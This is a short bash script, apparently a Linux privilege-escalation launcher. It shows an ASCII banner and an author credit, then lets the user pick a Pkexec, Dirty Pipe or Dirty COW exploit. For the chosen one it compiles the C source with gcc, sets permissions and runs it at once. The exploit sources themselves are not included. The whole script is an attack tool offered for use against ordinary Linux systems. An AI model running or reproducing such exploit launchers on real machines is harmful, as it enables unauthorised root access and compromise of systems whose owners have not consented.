#!/bin/bash
echo '@@@@@@@   @@@ @@@   @@@@@@   @@@  @@@  @@@@@@@   @@@@@@  ' 
echo '@@@@@@@@  @@@ @@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@@ ' 
echo '@@!  @@@  @@! !@@  @@!  @@@  @@!  @@@    @@!    @@!  @@@ ' 
echo '!@!  @!@  !@! @!!  !@!  @!@  !@!  @!@    !@!    !@!  @!@ ' 
echo '@!@@!@!    !@!@!   @!@!@!@!  @!@  !@!    @!!    @!@  !@! ' 
echo '!!@!!!      @!!!   !!!@!!!!  !@!  !!!    !!!    !@!  !!! ' 
echo '!!:         !!:    !!:  !!!  !!:  !!!    !!:    !!:  !!! ' 
echo ':!:         :!:    :!:  !:!  :!:  !:!    :!:    :!:  !:! ' 
echo ' ::          ::    ::   :::  ::::: ::     ::    ::::: :: ' 
echo ' :           :      :   : :   : :  :      :      : :  :  ' 
echo '                                                         ' 
echo "Writed by: @Bugra_2426"
echo
echo
echo
echo 'Plase select exploit type:'
echo  "1. Pkexec Exploit"
echo  "2.dirtpipe Exploit"
echo  "3.dirtcow Exploit"
read exploit

if [ $exploit = 1 ];then
gcc -o exploit Pkexec.c
echo 'Pkexec exploit compiled'
chmod 777 exploit
./exploit

elif [ $exploit = 2 ];then
gcc -o exploit dirtpipe.c
echo 'dirtpipe exploit compiled'
chmod 777 exploit
./exploit

else
gcc -o exploit dirtcow.c
echo 'dirtcow exploit compiled'
chmod 777 exploit
./exploit
fi
echo 'Script finished'
exit 0;